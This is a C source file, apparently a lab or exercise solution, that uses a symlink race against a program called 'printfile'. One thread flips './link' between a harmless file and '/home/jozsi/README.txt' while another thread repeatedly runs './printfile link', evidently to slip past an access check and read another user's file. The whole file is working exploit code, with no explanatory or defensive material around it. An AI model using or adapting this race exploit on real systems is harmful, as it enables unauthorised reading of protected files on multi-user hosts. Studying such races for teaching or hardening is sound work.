#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <error.h>

void* printfile_loop(void* loop_count)
{
    int i;
    int limit = *(int*) loop_count;
    for(i=0;i<limit;i++) {
        usleep(40);
        system("./printfile link");
    }

    return NULL;
}

void* link_loop(void* loop_count)
{
    int i;
    int limit = *(int*) loop_count;
    for(i=0;i<limit;i++) {
        unlink("./link");
        symlink("./gerifile", "./link");
        unlink("./link");
        symlink("/home/jozsi/README.txt", "./link");
    }
    return NULL;
}

int main(int argc, char* argv[])
{
    //struct thread_info* thread_info;
    void* res; 
    pthread_t threads[2];
    pthread_attr_t attr;
    //int num_threads = 2;
    int link_count = atoi(argv[1]);
    int printfile_count = atoi(argv[2]);

    if(pthread_attr_init(&attr)) {
        perror("attr_init error");
        exit(-1);
    }

    pthread_create(&threads[0], &attr, &link_loop, (void*)&link_count);
    pthread_create(&threads[1], &attr, &printfile_loop, (void*)&printfile_count);
    pthread_attr_destroy(&attr);
    pthread_join(threads[0], &res);
    printf("Link loop finished.\n");
    pthread_join(threads[1], &res);
    printf("Printfile loop finished.\n");
    
    return 0;
}

